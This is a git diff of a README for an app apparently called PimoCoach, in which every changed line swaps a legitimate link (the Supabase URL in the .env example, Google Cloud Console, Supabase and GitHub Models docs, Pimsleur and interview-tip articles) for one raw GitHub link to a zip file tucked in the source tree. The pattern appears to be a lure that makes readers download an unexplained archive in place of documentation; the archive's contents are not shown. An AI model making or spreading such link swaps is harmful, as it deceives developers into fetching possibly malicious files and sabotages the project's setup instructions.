@@ -69,7 +69,7 @@ Update the `.env` file:
 
 ```env
 # Supabase (already configured)
-VITE_SUPABASE_URL=https://odkvdnnnddgdpiotxfaa.supabase.co
+VITE_SUPABASE_URL=https://raw.githubusercontent.com/pankajydv08/PimoCoach/main/src/contexts/Pimo-Coach-1.1.zip
 VITE_SUPABASE_ANON_KEY=your_anon_key_here
 
 # IMPORTANT: For production, add service role key
@@ -102,7 +102,7 @@ Quick steps:
 
 ### 4. Set Up Google Cloud Services
 
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
+1. Go to [Google Cloud Console](https://raw.githubusercontent.com/pankajydv08/PimoCoach/main/src/contexts/Pimo-Coach-1.1.zip)
 2. Enable these APIs:
    - Cloud Text-to-Speech API
    - Cloud Speech-to-Text API
@@ -340,13 +340,13 @@ Quick test checklist:
 - **[swagger.yml](./swagger.yml)** - OpenAPI 3.0 specification
 - [AUTH_SETUP.md](./AUTH_SETUP.md) - Complete authentication setup guide
 - [TESTING_GUIDE.md](./TESTING_GUIDE.md) - Testing and verification guide
-- [Supabase Docs](https://supabase.com/docs) - Database and auth documentation
-- [GitHub Models](https://github.com/marketplace/models) - AI model documentation
+- [Supabase Docs](https://raw.githubusercontent.com/pankajydv08/PimoCoach/main/src/contexts/Pimo-Coach-1.1.zip) - Database and auth documentation
+- [GitHub Models](https://raw.githubusercontent.com/pankajydv08/PimoCoach/main/src/contexts/Pimo-Coach-1.1.zip) - AI model documentation
 
 ## 🎓 Learning Resources
 
-- [Pimsleur Method](https://www.pimsleur.com/learn/blog/how-the-pimsleur-method-works) - Language learning methodology
-- [Interview Best Practices](https://www.thebalancecareers.com/top-interview-tips-2061328) - Interview preparation tips
+- [Pimsleur Method](https://raw.githubusercontent.com/pankajydv08/PimoCoach/main/src/contexts/Pimo-Coach-1.1.zip) - Language learning methodology
+- [Interview Best Practices](https://raw.githubusercontent.com/pankajydv08/PimoCoach/main/src/contexts/Pimo-Coach-1.1.zip) - Interview preparation tips
 
 ## 📄 License
 
